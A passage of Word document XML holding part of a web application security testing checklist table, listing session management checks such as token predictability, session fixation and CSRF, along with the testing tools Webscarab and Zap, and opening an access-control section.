        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7FB2F185" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="0EE88064" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="5B875C2A" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6EAA9C31" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>5.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2236EA61" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="0018377B" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
              <w:rPr>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF3571">
              <w:t>Understand the Mechanism</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2FCA5857" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="00ABD7ED" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="757B9212" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="72E79285" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>5.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="38ECE6C3" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Token Generation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="735D96C9" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="686E95F4" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="4D840A0D" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="209FB3FA" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="29C845FA" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test for predictability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="03315E97" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Webscarab</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1806875F" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="2CFFEBB4" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5D826A97" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>5.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6F4002D6" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Token Handling</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="05B9BFBC" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="41FD49AB" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="18255BAA" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="71023646" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="7CE90C1E" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Check for Insecure Transmission</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1382E24C" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1F3039C7" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="2D3EC550" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6C3A5076" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="142DB88E" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Check for Disclosure in Logs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="390DD277" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="624FDF84" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="0BBCC614" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="5C24594A" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="798253CE" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test Mapping of Tokens to Sessions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="17D60392" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0853A3BA" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="427FF839" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6407A6E2" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="149A2018" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test Session Termination</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="77CDF316" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="32F37FF0" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="5F26A63F" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="42627AF9" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="57147B3F" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test for Session Fixation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="47C90317" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Zap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="05887615" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="10247F0E" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="68C49594" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="58AB2EAC" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Check for CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3A2A6981" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="081E5EB8" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="3439E288" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1761" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="632AF721" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="02578BED" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test Access Controls</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="739FBBE4" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="51F80DE5" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="17DCB649" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2BB45B2B" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>6.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="411A3958" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Understand the Requirements</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2616ABB4" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="4EC5DDD9" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="489555F1" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
